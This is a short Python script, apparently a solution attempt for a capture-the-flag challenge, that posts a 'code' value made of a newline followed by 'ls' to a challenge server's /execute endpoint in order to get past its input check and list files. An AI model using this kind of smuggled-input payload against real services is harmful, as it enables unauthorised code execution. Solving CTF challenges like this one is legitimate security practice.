#!usr/bin/env/python3

import requests

url = 'https://uoftctf-no-code.chals.io/execute'


req = requests.post(url,data = {'code': '\n ls'})

print(req.text)